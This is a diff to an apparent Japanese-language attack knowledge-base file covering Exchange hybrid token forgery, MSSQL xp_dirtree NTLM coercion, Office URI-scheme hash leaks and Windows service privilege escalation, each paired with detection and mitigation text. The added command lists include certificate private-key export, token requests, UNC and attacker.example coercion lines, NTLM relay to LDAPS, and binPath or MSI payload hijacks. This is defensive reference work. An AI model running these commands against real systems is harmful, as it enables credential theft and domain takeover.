     "mitigate": "特権を付与する動的グループの membershipRule を棚卸しし、書込可能属性(department, jobTitle, city, companyName, mobile, extensionAttribute 等)を規則のキーにしない—HR ソース同期など管理者/信頼ソースのみが書き込む属性に限定する(オンプレ同期属性は AD 側で SELF 書込権限が付いていないかも確認し、必要なら剥奪)。特権付与にはロール割当可能グループ(isAssignableToRole=true・assigned メンバーシップ)を用いる—Microsoft の仕様上ロール割当可能グループは動的メンバーシップにできず(assigned 必須)、この制約自体が本攻撃に対する緩和として機能する。ゲストのプロフィール属性書込・自己編集可能属性を最小化(External collaboration settings / Guest user access restrictions を最も制限的に)し、ゲストや動的グループに特権(Azure RBAC/アプリロール/CA 除外/アクセスパッケージ)を紐付けない。ユーザー属性書込を持つアプリ/SP(Directory.ReadWrite.All, User.ReadWrite.All)を最小化・棚卸しする。動的グループの membershipRule 変更(Update group)と特権グループのメンバー変化をリアルタイムアラート化し、特権動的グループのメンバー(ゲスト/新規アカウント混入)棚卸しを定期実施する。",
@@ -11442,6 +18605,38 @@ AD.I18N.ja.attacks = [
     "summary": "オンプレExchangeサーバの管理者権限(RCEや資格窃取で取得)を得た攻撃者が、ハイブリッド構成でオンプレとExchange Onlineが共有する単一のファースト系サービスプリンシパル『Office 365 Exchange Online』(appId 00000002-0000-0ff1-ce00-000000000000。そのkeyCredentialsにオンプレExchangeの認証証明書が登録され『trusted for delegation』)を悪用し、オンプレが保持する証明書秘密鍵でサーバ間(S2S)actorトークン(=「オンプレExchangeがユーザXとして動作する」旨の署名済みJWT)をACS(Access Control Service)経由で組み立て/入手して、クラウド側の任意ハイブリッドユーザ(そこからGlobal Admin相当まで昇格可)へなりすます、オンプレ→クラウドの特権昇格。Exchange Onlineは共有SPの証明書を信頼して署名を再検証しないため、actorトークンは条件付きアクセスを回避し約24時間有効。オンプレExchange側がクラウドで信頼される共有SPの認証用証明書の秘密鍵を保持するため、オンプレ侵害がそのままEntra/EXO侵害に直結するトラスト境界の穴が本質。致命的なのは、actorトークンは発行時にログが残らず、使用も被なりすましID名義で記録されるため、クラウド側の監査痕跡がほぼ皆無な点。CVSS 8.0(MS深刻度Important/CISA High)、CISA緊急指令ED 25-02(2025-08-07)、Dirk-jan MollemaがBlack Hat USA 2025で公表。既存の共有トラストの悪用でありトラスト改変(T1484.002)ではない。",
     "how": "前提: 攻撃者はまずProxyShell/ProxyNotShell/ProxyLogon等のオンプレExchange RCEや窃取した管理者資格情報で、オンプレExchangeサーバのローカル管理者/SYSTEMを掌握する。ハイブリッド構成はHybrid Configuration Wizard(HCW)により、オンプレExchangeの「Microsoft Exchange Server Auth Certificate」(サーバ間OAuth=S2S用の認証証明書)を、Entra上の高権限な共有ファースト系サービスプリンシパル『Office 365 Exchange Online』(appId 00000002-0000-0ff1-ce00-000000000000)のkeyCredentialsとして登録し、この単一SPをオンプレとExchange Onlineの双方が信頼する構造になっている(=証明書という資格情報がトラスト境界をまたいで共有される)。攻撃者はオンプレ側でGet-AuthConfigにより現在のS2S認証証明書のサムプリントを確認し、ローカル証明書ストアからその秘密鍵を抽出(certutil -exportPFX / Export-PfxCertificate、非エクスポート鍵はMimikatz crypto等)する。以降、証明書は2系統で悪用される。[核心・ステルス経路] 攻撃者は証明書でactorトークン(S2Sの署名済みJWT、「オンプレExchange=actorがユーザXとして動作」を主張)を組み立て、ACS(Access Control Service)経由でトークンを得てExchange Onlineへ提示する。EXOは共有SPを『trusted for delegation』として信頼し署名を再検証せず、actorトークンをそのまま受理して任意ハイブリッドユーザのメールボックス/SharePointへ条件付きアクセスを回避してアクセスする(約24時間有効)。このactorトークンは発行時にログを生成せず、使用も被なりすましユーザ名義で記録されるためほぼ不可視。[二次経路・Graph/ディレクトリ] 同じ証明書は共有SPのkeyCredentialなので、client_assertion(署名済みJWT)でEntraトークンエンドポイント(login.microsoftonline.com/{tenant}/oauth2/v2.0/token)にapp-only認証し、共有SPが持つ広範なディレクトリ権限でロール付与・SPへの資格情報追加・アプリ所有者追加等を行いGlobal Admin相当まで昇格し得る。なおこのapp-only経路はSPサインインログに残るが、上記actorトークン経路は残らない点が検知上の分岐となる。核心プリミティブは「オンプレが秘密鍵を保持する証明書が、そのままクラウドで信頼される共有SPの認証情報である」というトラスト境界をまたいだ資格情報共有で、オンプレ管理権限=クラウド昇格に直結する(∴既存トラストの悪用でありT1484.002トラスト改変は不適)。同じactorトークン機構を土台とするが、CVE-2025-55241(ACS actorトークンの発行元テナント検証欠陥を突く任意テナント横断なりすまし、CVSS 10.0、別途2025年9月に修正)は別CVE・別欠陥であり、本CVEはオンプレExchange管理権限→自組織テナントのEXO/Entra昇格(組織内)である。これらのトークン発行・使用は正規のハイブリッドS2Sトラフィック(自由/多忙・メール移行・メールフロー)に酷似し、Exchange Online/Entra側の監査痕跡がほとんど残らないためフォレンジックが困難。",
     "tools": "AADInternals (Get-AADIntAccessTokenForEXO 等のハイブリッド/EXOトークン発行関数), ROADtools (roadtx/roadrecon, S2S/app-onlyトークン生成・テナント列挙), Exchange Management Shell (Get-AuthConfig/Set-AuthConfig/Get-HybridConfiguration), EWS / Microsoft Graph, certutil -exportPFX / Export-PfxCertificate / Mimikatz crypto(Exchange認証証明書の秘密鍵抽出), 自作のactorトークン/client_assertion(署名済みJWT)生成PoC(Dirk-jan Mollemaが示したS2S actorトークン組み立て手法)",
+    "cmd": [
+      {
+        "tool": "Exchange EMS",
+        "t": "現在のS2S認証証明書のサムプリントを確認する偵察。オンプレExchange管理者権限があれば誰でも実行できる",
+        "q": "Get-AuthConfig | Format-List CurrentCertificateThumbprint"
+      },
+      {
+        "tool": "certutil.exe",
+        "t": "S2S認証証明書の秘密鍵をローカルストアからエクスポート。ローカル操作のためクラウド側監査ログには現れない",
+        "q": "certutil -exportPFX -p Passw0rd! My <thumbprint> C:\\Temp\\authcert.pfx"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "同じ秘密鍵抽出のPowerShell版。4104のスクリプトブロックにコマンドレット名が残る数少ない痕跡",
+        "q": "Export-PfxCertificate -Cert Cert:\\LocalMachine\\My\\<thumbprint> -FilePath C:\\Temp\\authcert.pfx -Password (ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)"
+      },
+      {
+        "tool": "Exchange EMS",
+        "t": "ハイブリッド構成の存在と共有SP関係を確認する偵察。単体では正規運用と区別できない",
+        "q": "Get-HybridConfiguration"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "証明書からactorトークンをACS経由で要求。発行時にログが残らず被なりすまし名義でのみ記録されクラウド側の可視性はほぼ皆無",
+        "q": "Invoke-RestMethod -Uri 'https://accounts.accesscontrol.windows.net/<tenant>/tokens/OAuth/2' -Method POST -Body @{grant_type='urn:ietf:params:oauth:grant-type:jwt-bearer'; assertion=$signedActorJWT; resource='https://outlook.office365.com/'}"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "同じ証明書でGraphのapp-only認証を行う二次経路。actorトークンと異なりこちらはSPサインインログに残る分岐点",
+        "q": "Invoke-RestMethod -Uri 'https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token' -Method POST -Body @{grant_type='client_credentials'; client_id='00000002-0000-0ff1-ce00-000000000000'; client_assertion_type='urn:ietf:params:oauth:client-assertion-type:jwt-bearer'; client_assertion=$signedJWT; scope='https://graph.microsoft.com/.default'}"
+      }
+    ],
     "detect": "検知は複数レイヤの相関に依存し、クラウド単独では不十分。★重要: 核心のACS actorトークン経路は発行時ログを生成せず、使用も被なりすましユーザ名義で記録されるため、共有SPのサインインログには現れない。従って主軸は(1)オンプレExchangeホストのテレメトリ(RCE痕跡・S2S認証証明書の秘密鍵抽出・攻撃ツール実行)と(2)EXO統合監査ログ(UAL)の異常アクセスの相関になる。信号の内訳: 【Entra SPサインイン】Sentinel: AADServicePrincipalSignInLogs / MDE: EntraIdSpnSignInEvents で、共有SP『Office 365 Exchange Online』(appId 00000002-0000-0ff1-ce00-000000000000)が正規のオンプレExchangeサーバIP以外(新規IP/海外/攻撃者ホスト)からサインインする事象 ― ただしこれはapp-only(client-credentials)経路のみ捕捉し、actorトークン経路は捕捉しない。【EXO UAL】Sentinel: OfficeActivity で、単一ソースIP/セッションから短時間に多数の異なるメールボックス所有者へのMailItemsAccessed。※各ユーザをなりすまして自メールボックスを読む場合Logon_TypeはOwnerとして記録され得るため、Logon_Type≠Ownerのみに依存せずClientIP×dcount(所有者)で規模異常を捉える。Add-MailboxPermission/New-InboxRule等の多発も補助信号。【Entra AuditLogs】対応するユーザサインイン(SigninLogs)を伴わない特権変更(ロール付与、SPへのkeyCredential/passwordCredential追加、アプリ所有者追加)は強い相関シグナル。【オンプレExchangeサーバ】Get-AuthConfig/Set-AuthConfigの実行、S2S認証証明書の秘密鍵エクスポート(certutil -exportPFX/Export-PfxCertificate)、AADInternals/roadtx実行、w3wp.exe配下からのPowerShell生成、login.microsoftonline.com/accounts.accesscontrol.windows.net宛通信を監視。クラウドのトークン発行・使用自体はWindowsセキュリティイベントを発火せず、痕跡はオンプレ侵害段階(RCE/管理シェル)とEntra/EXOログに分散する点に注意。",
     "events": "Entra: AADServicePrincipalSignInLogs(共有Exchange SPの想定外IPからのapp-onlyサインイン=二次経路のみ), EntraIdSpnSignInEvents(MDE同等), AuditLogs(対応サインインを伴わないロール付与/SP資格情報追加/アプリ所有者追加); Exchange Online: OfficeActivity(MailItemsAccessed/Add-MailboxPermission/New-InboxRule、単一ClientIP×多数の異なる所有者); オンプレExchange(操作端末のみ): 4688(powershell/certutil/Exchange管理シェル), Sysmon EID1(w3wp.exe子プロセスからのpowershell/certutil)・EID11(エクスポートされた.pfxファイル生成)、CAPI2 Operationalログ(証明書秘密鍵の取得), Exchange Cmdlet監査ログ(Get/Set-AuthConfig, Get-HybridConfiguration) — ★ACS actorトークンの発行・使用はEntraサインインログにもWindowsイベントにも残らず、使用は被なりすましID名義で記録される。",
     "mitigate": "(1) 2025年4月以降のExchange Serverホットフィックス(HU)を適用し、Microsoftが提供する『専用Exchangeハイブリッドアプリ』を構成スクリプト ConfigureExchangeHybridApplication.ps1 で展開して、共有SPに依存しない専用SPへ移行する。(2) 移行後は共有SP『Office 365 Exchange Online』上に残る旧keyCredentials(オンプレ由来証明書)をService Principal Clean-Up Modeでリセット/削除し、オンプレ証明書がクラウド側で信頼され続ける状態(=actorトークンを発行できる状態)を解消する。(3) CISA緊急指令ED 25-02に従い、Exchange Server Health Checkerで対象サーバと構成を棚卸しし、切断済み/未使用ハイブリッドの共有SP資格情報も確実に除去する。(4) オンプレExchangeを最新CU+SUに保ち、ProxyShell/ProxyNotShell等の初期侵入経路を塞ぎ、Exchangeサーバへの管理者アクセスを最小化する(そもそもオンプレExchange管理権限が前提のため初期侵害防止が最重要)。(5) AADServicePrincipalSignInLogs/OfficeActivity/AuditLogsをSIEMへ集約し、共有Exchange SPの異常app-onlyサインインと「ユーザサインインを伴わない特権変更」「単一ソースからの多数メールボックスアクセス」を高優先アラート化する。(6) Global Admin数を最小化しPIM(Just-In-Time)・フィッシング耐性MFAで昇格後の被害拡大を抑制する。",
@@ -11487,6 +18682,38 @@ AD.I18N.ja.attacks = [
     "summary": "低権限のMSSQLログインでも実行できる拡張ストアドプロシージャxp_dirtree/xp_subdirs/xp_fileexistにUNCパスを渡すだけで、SQL Serverエンジン自身がファイルシステム列挙のためSMB接続を試み、SQLサービスアカウントのNTLM認証を攻撃者へ発信させられる強制認証(コアーシオン)技術。捕捉したNetNTLMv2ハッシュはオフラインクラックに使えるほか、LDAPへ中継すればRBCDやShadow Credentials、ADCS Web EnrollmentへリレーすればESC8による証明書発行に直結する。sysadmin権限が不要でCoercer等のRPCベースツールの守備範囲外にあるため、既存の検知網から漏れやすい定番の起点技術である。",
     "how": "前提はMSSQLへの任意のログイン(sysadmin不要、xp_dirtree/xp_subdirs/xp_fileexistのEXECUTE権限があれば良く、これらの拡張ストアドプロシージャは既定でpublicロールに実行権が付与されているため、CISベンチマーク等で当該権限の剥奪が推奨されているにもかかわらず業務影響を懸念して未対応のまま残る環境が多い)のみ。攻撃者はEXEC master..xp_dirtree '\\\\attacker-ip\\share\\x',1,1;(代替としてEXEC master..xp_subdirs '\\\\attacker-ip\\share\\x';やEXEC master..xp_fileexist '\\\\attacker-ip\\share\\x';も同様に機能する)を実行する。これによりSQL Serverエンジンプロセス(sqlservr.exe)がファイル/ディレクトリ列挙のため指定UNCパスへSMB接続を試み、その過程でSQLサービスアカウント(既定のNT SERVICE\\MSSQLSERVERのほか、しばしばgMSAやドメイン特権を持つレガシーサービスアカウントが設定されている)のNTLM認証がSMB上で発信される。攻撃者はResponderやInveighでこの着信認証を捕捉しNetNTLMv2ハッシュをhashcat(-m 5600)でオフラインクラックするか、捕捉と同時にntlmrelayx.py(impacketのSMBServerモジュール)でリアルタイムに中継する。中継先をLDAP/LDAPSに向ければRBCD(msDS-AllowedToActOnBehalfOfOtherIdentityの書込)やShadow Credentials(msDS-KeyCredentialLinkの追加)を設定してSQLサービスアカウントの文脈でなりすまし昇格でき、ADCS Web Enrollment(HTTP)エンドポイントに向ければESC8で証明書を不正発行させドメイン侵害へ直結する。成立条件は対象のSMB署名が強制されていないこと、中継先のLDAP/ADCSにEPA(拡張保護)が無効なこと、SQLサーバから攻撃者/リスナーへのアウトバウンド445/TCP到達性があることで、これらはいずれもデフォルト設定で満たされがちな環境固有の弱点である。sysadmin権限が不要でxp_dirtree等の実行権限のみで足りるため、業務アプリ用の低権限SQLログイン1つを侵害しただけでも成立する低い実行障壁がこの技術の核心である。",
     "tools": "Responder, Inveigh, impacket ntlmrelayx.py(SMBServerモジュール), impacket mssqlclient.py, PowerUpSQL, SQLRecon, Certipy(ESC8連携), hashcat(-m 5600 NetNTLMv2オフラインクラック)",
+    "cmd": [
+      {
+        "tool": "T-SQL",
+        "t": "最も一般的な強制認証、`xp_dirtree`とUNCパスがSQL監査/Extended Eventsにそのまま残る決定的シグナル",
+        "q": "EXEC master..xp_dirtree '\\\\10.0.0.5\\share\\x',1,1;"
+      },
+      {
+        "tool": "T-SQL",
+        "t": "xp_dirtreeの代替、同じくpublicロールに実行権が既定付与されがちで見落とされやすい",
+        "q": "EXEC master..xp_subdirs '\\\\10.0.0.5\\share\\x';"
+      },
+      {
+        "tool": "T-SQL",
+        "t": "ファイル存在チェックを装う版、戻り値を使わず認証誘発のみが目的で直後に接続が切れるのが特徴",
+        "q": "EXEC master..xp_fileexist '\\\\10.0.0.5\\share\\x';"
+      },
+      {
+        "tool": "Impacket",
+        "t": "低権限ログインでの接続確立、直後のxp_dirtree実行と組み合わせて見る起点",
+        "q": "mssqlclient.py corp.local/svc_user:'Passw0rd!'@10.0.0.30 -windows-auth"
+      },
+      {
+        "tool": "Responder",
+        "t": "SQLサービスアカウントの着信NTLMv2を捕捉、証跡はSQL側でなくResponderのキャプチャログに残る",
+        "q": "Responder.py -I eth0"
+      },
+      {
+        "tool": "Impacket",
+        "t": "捕捉と同時にLDAPSへ中継しRBCD/Shadow Credentialsを設定する",
+        "q": "ntlmrelayx.py -t ldaps://dc01.corp.local -smb2support"
+      }
+    ],
     "detect": "SQL Serverホスト(sqlservr.exe)からのアウトバウンド445/139(SMB)接続を監視し、既知のバックアップ/ファイルサーバ以外への接続を異常とする。SQL Server側は既定でxp_dirtree等の実行をログに残さないため、Extended Events(rpc_completed/sql_statement_completed)セッションを追加設定しstatement LIKE '%xp_dirtree%' OR '%xp_subdirs%' OR '%xp_fileexist%'で引数UNCパスを捕捉する必要がある。中継が成立した場合は中継先(DC/LDAP、ADCS Web Enrollment)側で、SQLサービス/マシンアカウントがそのSQLサーバの通常アクセスパターンにない送信元/宛先へNTLM認証(4624, LogonType3, AuthenticationPackageName=NTLM)しており、直後にmsDS-AllowedToActOnBehalfOfOtherIdentityやmsDS-KeyCredentialLinkの書込(5136)、証明書発行(4886/4887)が同一アカウントで連鎖していないかを相関する。",
     "events": "5140/5145(共有アクセス。ただしResponder/ntlmrelayxのSMBServerモジュールはPython実装のSMBエミュレーションでありWindowsセキュリティ監査ログを生成しないため攻撃者側リスナーでは観測不可能。正規WindowsホストにカナリアSMB共有を用意し監査を有効化している場合にのみ、そのホスト側でSQLサービスアカウントによる異常アクセスとして観測できる), 4624/4625(中継先でのNTLM着信ログオン, LogonType3), 5136(msDS-AllowedToActOnBehalfOfOtherIdentity/msDS-KeyCredentialLink変更=RBCD/Shadow Credentials設定), 4886/4887(ADCS証明書要求/発行=ESC8連携時), SQL Server Extended Events rpc_completed(既定では未収集、追加設定が必要)",
     "mitigate": "xp_dirtree/xp_subdirs/xp_fileexistの実行権限は既定でpublicロールに付与されているため、REVOKE EXECUTE ON <対象拡張ストアドプロシージャ> TO publicで明示的に剥奪した上で、業務上必要なログインにのみ個別のカスタムロールを介してGRANTする。SQLサーバからのアウトバウンドSMB(445/139)をホスト/境界ファイアウォールで既定拒否し、必要な共有のみ許可リスト化する。ドメイン全体でSMB署名を必須化し、LDAP署名/LDAPSチャネルバインディングとADCSのExtended Protection for Authentication(EPA)を有効化してリレー自体を無効化する。SQL Serverサービスアカウントは高権限ドメインアカウントではなくgMSAまたは専用の低権限アカウントで運用し、委任設定を最小化する。可能な範囲でNTLMを無効化/制限し、Kerberosのみを許可するGPOを適用する。",
@@ -11532,6 +18759,33 @@ AD.I18N.ja.attacks = [
     "summary": "Word/Excel/PowerPointが登録するms-word:/ms-excel:/ms-powerpoint:カスタムURIスキームに\"ofe|u|<URL>\"形式でリモートファイルパスを埋め込むと、通常なら表示される「インターネットから取得したファイル」警告やProtected Viewを経由せずOfficeが直接リモートドキュメントを開いてしまう。開いたURLがGPO等でイントラネット/信頼済みサイトゾーンに登録され自動ログオンが有効な場合、Officeプロセスは警告なくNTLM認証を自動送出しNet-NTLMv2ハッシュが漏えいする。Outlook固有の既存技法(MonikerLink/リマインダ処理)とは異なり、Office全製品のURIプロトコルハンドラそのものに起因する独立したトリガー経路である。",
     "how": "攻撃者はブラウザ/チャット/Webページ/PDF内リンク・QRコード等、Outlook以外の任意の配信経路を用意し、\"ms-word:ofe|u|http://attacker.example/leak.docx\"(Excelはms-excel:ofe|u|…、PowerPointはms-powerpoint:ofe|u|…)形式のURIをユーザに送付・掲載する。\"ofe|u|<URL>\"という構造は、Officeがレジストリ(HKEY_CLASSES_ROOT\\ms-word等、\"URL Protocol\"値を持つキーのshell\\open\\commandにWINWORD.EXE等を紐付け)に登録するカスタムURIプロトコルハンドラが直接解釈し、通常の拡張子ファイル関連付け経由のオープンを経ないためMark of the Web由来の「保護ビュー」「発行元を確認できません」警告ダイアログが表示されない。ユーザがリンクをクリックするとShellExecute経由でOfficeプロセスが直接起動し指定URLへHTTP/SMB接続する。宛先がGPOの「サイトとゾーンの割り当て一覧」または「イントラネットゾーンで自動的にログオンする」設定でイントラネット/信頼済みサイトに登録済みのIP範囲・ホスト名に一致する場合、WinInet/WinHTTPのWindows統合認証がNTLM/Net-NTLMv2ハンドシェイクを自動的に開始する。攻撃者はResponder/Inveigh/ntlmrelayxでリスナーを立ててハッシュをキャプチャしオフラインクラック、またはSMB/LDAP(ESC8含む)へのリレーに直接転用する。file://リンクを使う旧来のNTLM強制と異なりURIスキーム自体が独立したプロトコルハンドラであるため、メール本文だけでなくブラウザアドレスバー直打ちや<a href=\"ms-word:...\">タグでも発火する点が特徴。本技法はユーザーがms-word:等のURIリンクをクリックする行為で発火するため、MITRE分類上はファイルを直接開く操作を指すT1204.002ではなくT1204.001(Malicious Link)に該当する。2024年8月のOffice更新はofe|u|URI経由でリモートファイルを開く際に警告なしでNTLM自動送出する経路を修正した。",
     "tools": "PoC URI手動生成(ms-word:ofe|u|<URL>形式), Responder, Inveigh, ntlmrelayx.py(impacket, ESC8/LDAPリレー併用), smbserver.py(impacket, NTLMキャプチャ用), Burp Collaborator/Canarytokens(検証・アウトオブバンド確認用), certipy(ESC8併用時)",
+    "cmd": [
+      {
+        "tool": "PoC URI",
+        "t": "クリックで発火する実URI、`ofe|u|`のパイプ区切りがWordのモニカハンドラを直接呼びMOTW判定を回避する",
+        "q": "ms-word:ofe|u|http://attacker.example/leak.docx"
+      },
+      {
+        "tool": "PoC URI",
+        "t": "Excel版、Officeプロトコルハンドラ共通の欠陥のため製品名を差替えるだけで同様に発火する",
+        "q": "ms-excel:ofe|u|http://attacker.example/leak.xlsx"
+      },
+      {
+        "tool": "Impacket",
+        "t": "302リダイレクトでUNCへ誘導した着地点、WINWORD.EXEからの445接続とNet-NTLMv2受信が一次証跡",
+        "q": "smbserver.py share ./loot -smb2support"
+      },
+      {
+        "tool": "Responder",
+        "t": "WebDAV/UNC直接指定時の捕捉、プロセスはWINWORD.EXEだがハッシュはResponder側ログに残る",
+        "q": "Responder.py -I eth0"
+      },
+      {
+        "tool": "Impacket",
+        "t": "捕捉したNTLMをESC8/LDAPへ即時中継する",
+        "q": "ntlmrelayx.py -t ldaps://dc01.corp.local -smb2support"
+      }
+    ],
     "detect": "Officeプロセス(WINWORD.EXE/EXCEL.EXE/POWERPNT.EXE)がブラウザ・メールクライアント・チャットアプリを親プロセスとし、コマンドライン引数にms-word:/ms-excel:/ms-powerpoint:を含んで起動される事象と、その直後(数秒以内)に同プロセス自身が445(SMB)/80/443(WebDAV/HTTP)で社外/未知の宛先へアウトバウンド接続する事象をEDRのプロセス生成・ネットワーク接続テレメトリで相関する。通常のローカル文書オープンではOfficeプロセス起動前後にファイル書込み/既存ファイルオープンのイベントが先行するが、本技法では先行するファイル操作なしにいきなり外部ネットワーク接続が発生する点が識別点。加えて、攻撃者が捕捉したNet-NTLMv2ハッシュを監視対象のLDAP/ADCS/ファイルサーバへリレーした場合はNTLM認証ログ(4624 Logon Type 3、4776)で認証元ワークステーション名がOfficeクライアント端末、認証先が本来アクセス実績のないサーバ名である相関を確認できる(組織外の不正リスナーへの一次窃取自体はドメイン側の認証ログには残らない点に留意)。",
     "events": "4624(Logon Type 3, AuthenticationPackageName=NTLM), 4776(NTLM資格情報検証), Sysmon 1(WINWORD.EXE/EXCEL.EXE/POWERPNT.EXEの起動、CommandLineにms-word:等を含む), Sysmon 3(Officeプロセスから445/80/443への外部アウトバウンド接続), SMBクライアント/WebDAVクライアントログ, プロキシ/FWログ(User-Agent \"Microsoft Office\"を含む未知ホストへのリクエスト)",
     "mitigate": "2024年8月のOffice月例更新(Microsoft 365 Apps/Office 2016-2021/LTSC全チャネル)を適用しofe|u|URI経由の警告バイパスを解消する。GPO「サイトとゾーンの割り当て一覧」および「イントラネットゾーンで自動的にログオンする」設定を必要最小限のホスト/IPに限定し、可能な範囲で自動ログオンを無効化してNTLM認証前に資格情報プロンプトを強制する。SMB署名の必須化、LDAP署名/チャネルバインディング(EPA)、NTLMリレー対策(Extended Protection for Authentication、特にADCS Web登録エンドポイントのESC8対策)を全社的に有効化しNTLM窃取後のリレー悪用を遮断する。中長期的にはNTLM自体の制限(Restrict NTLM: NTLM authentication in this domain)を検討し、Officeプロセスからの予期しないアウトバウンドSMB/WebDAV接続をエグレスFWでブロックする。",
@@ -11577,6 +18831,38 @@ AD.I18N.ja.attacks = [
     "summary": "ドメイン参加端末上でSYSTEM/管理者権限で動くWindowsサービスやMSIインストーラの構成不備――サービス実行ファイル/フォルダのDACL誤設定、サービスレジストリキーへの書込権限、スペースを含みクォートされていない実行パス、AlwaysInstallElevatedポリシーの有効化――のいずれかを低権限ユーザーが悪用し、SYSTEM権限のプロセス起動またはMSIインストールをトリガーに任意コードを実行してローカル権限昇格する、最も頻出するホストLPEの基礎技法群。PowerUp.ps1/WinPEAS/Seatbelt/SharpUpにより機械的に列挙されるため攻撃者・SOC双方にとって既知の定番経路である。",
     "how": "前提: ドメイン参加端末上の低権限(非管理者)ユーザーとしてのコード実行。まず sc query state=all / Get-WmiObject win32_service / PowerUp.ps1 Get-ServiceUnquoted・Get-ModifiableServiceFile・Get-ModifiableService・Get-ModifiableServiceRegistryKey で列挙する。①弱いサービスDACL: sc.exe や Set-Service で自動起動/BUILTIN\\Users書込可能なサービスの binPath を攻撃者バイナリへ書換 (sc config <svc> binPath= \"C:\\temp\\evil.exe\")、対象がLocalSystem/NT AUTHORITY\\SYSTEMで実行される場合、サービス再起動または端末再起動でSYSTEM実行に至る(MITRE公式もsc.exe/PowerShell/Regを共にT1574.011の実行手段として挙げており、サービスの構成情報自体を保持するHKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc>キーへの書込権限——SC Manager経由・レジストリ直接編集経由のいずれか——がある場合がこれに該当)。②サービスファイル/フォルダのDACL誤設定: icacls \"C:\\Program Files\\VulnSvc\\svc.exe\" でBUILTIN\\Users等にWRITE/FULLがある場合、実行ファイル自体またはその読み込みDLLを悪性版に差し替え、サービス起動時にSYSTEMとしてロードさせる(T1574.010)。③クォート無しサービスパス: レジストリのImagePathが C:\\Program Files\\Some App\\service.exe のようにクォートなしでスペースを含むと、Windowsのパス解決規則により C:\\Program.exe → C:\\Program Files\\Some.exe の順に実行を試みるため、書込可能な上位ディレクトリ(通常C:\\直下やC:\\Program Files直下)にProgram.exe等を配置し、サービス起動時にそちらが優先実行される(T1574.009)。④AlwaysInstallElevated: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer および HKCU側の同名キーのAlwaysInstallElevatedが共に1の場合、非管理者でも msiexec /i evil.msi /quiet でMSIをSYSTEM権限でインストールでき、悪性MSI(msfvenomやWiXで作成)経由で即座に昇格する。これはサービス構成の脆弱性ではなくWindows Installerの権限昇格制御機構(Elevation Control)を対象ポリシー誤設定によって迂回するもの(T1548)であり、実行段はmsiexec.exeというシステムバイナリを介した悪性ペイロード実行に当たる(T1218.007、MITRE公式もmsiexec.exe解説内でAlwaysInstallElevated有効時にSYSTEM権限へ昇格しうる旨を明記)ため、他の3経路(T1574系列)とは別カテゴリの機序として扱う。いずれの経路も「低権限で書込/設定変更可能な箇所」から「SYSTEMコンテキストでの実行トリガー」への権限境界越えが核心プリミティブ。",
     "tools": "PowerUp.ps1(Get-ServiceUnquoted/Get-ModifiableServiceFile/Get-ModifiableService/Get-ModifiableServiceRegistryKey/Get-RegistryAlwaysInstallElevated), WinPEAS, Seatbelt, SharpUp, AccessChk(accesschk.exe), sc.exe, icacls.exe, msiexec.exe, msfvenom(MSI/EXEペイロード生成), PsService, reg.exe",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "PowerUpの全チェックを一括実行し弱いサービスDACL/クォート無しパス/AlwaysInstallElevatedを一度に洗い出す",
+        "q": "Invoke-AllChecks"
+      },
+      {
+        "tool": "sc.exe",
+        "t": "書込可能なサービスのbinPathを攻撃者バイナリへ書換。`sc config ... binPath=`は正規運用でまず出ない",
+        "q": "sc.exe config VulnSvc binPath= \"C:\\Windows\\Temp\\evil.exe\""
+      },
+      {
+        "tool": "icacls.exe",
+        "t": "サービス実行ファイル/フォルダへのBUILTIN\\Users書込可否を確認する偵察",
+        "q": "icacls.exe \"C:\\Program Files\\VulnApp\\svc.exe\""
+      },
+      {
+        "tool": "copy.exe",
+        "t": "クォート無しパスの解決順序を悪用し先頭の空白区切りにバイナリを設置。`Program Files`直下への書込自体が異常",
+        "q": "copy.exe C:\\Windows\\Temp\\evil.exe \"C:\\Program Files\\Vulnerable App\\Program.exe\""
+      },
+      {
+        "tool": "msiexec.exe",
+        "t": "AlwaysInstallElevated有効時にMSIを常にSYSTEM権限でインストール。非管理者からの`msiexec /i`直後のSYSTEM子プロセスが決定打",
+        "q": "msiexec.exe /quiet /qn /i evil.msi"
+      },
+      {
+        "tool": "reg.exe",
+        "t": "悪用可否を判定する事前確認。HKCU/HKLM両方が1の場合のみ成立するため単体では判断不可",
+        "q": "reg.exe query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+      }
+    ],
     "detect": "主要シグナル: (1) sc.exe/icacls.exe/reg.exeがサービス実行ファイルパス・サービスレジストリキー(HKLM\\SYSTEM\\CurrentControlSet\\Services\\配下)のImagePath/DACLを非管理端末・非デプロイツールの文脈で変更(4688でsc config・icacls・reg add対象がServicesキー、Sysmon 13でServicesレジストリ値変更、Sysmon 1でicacls/sc.exeのコマンドライン)。(2) サービス制御対象外ディレクトリ(C:\\直下やC:\\Program Files直下)への新規.exe作成が、既存クォート無しサービスのパストークンと一致(Sysmon 11でC:\\Program.exe等の作成、DeviceFileEvents)。(3) 保護外フォルダ(サービスインストールパス)へのファイル書込・置換が非TrustedInstaller/非サービスアカウントから発生(DeviceFileEvents/Sysmon 11)。(4) AlwaysInstallElevatedキー2つの読取/変更(Sysmon 12/13でPolicies\\Microsoft\\Windows\\Installerの変更監視)と、直後の非対話msiexec /i /quietの実行かつ親プロセスが管理コンソールでないもの(4688、Sysmon 1、DeviceProcessEvents)。(5) PowerUp/WinPEAS/Seatbelt/SharpUpの列挙コマンドライン実行そのもの。テレメトリ源: Windows Security監査(オブジェクトアクセス・レジストリ監査要有効化)、Sysmon(1/11/12/13)、MDE Device*テーブル、サービス制御マネージャイベント。",
     "events": "4688(sc.exe/icacls.exe/msiexec.exe/reg.exeの実行), Sysmon 1(PowerUp/WinPEAS/Seatbelt/SharpUp実行), Sysmon 11(C:\\Program.exe等クォート無しパス標的位置へのファイル作成、サービスフォルダへの書込), Sysmon 12/13(HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc>のImagePath変更・HKLM/HKCU Policies\\Microsoft\\Windows\\InstallerのAlwaysInstallElevated値変更), 4657(レジストリ値変更・要SACL), 7045(新規サービスインストール), 7040(サービス開始種別変更), 4670(サービスファイル/フォルダの所有者・アクセス許可変更)",
